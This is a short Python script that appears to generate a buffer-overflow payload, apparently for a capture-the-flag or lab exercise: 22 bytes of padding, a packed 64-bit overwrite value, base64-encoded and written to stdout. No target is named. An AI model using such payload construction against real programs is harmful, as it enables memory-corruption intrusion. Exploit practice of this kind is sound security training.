
import sys
import struct
import base64

buf = b'uuuuuuuuuuuuuuuuuuuuuu'
buf += struct.pack('<Q', 7476933106105312244)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
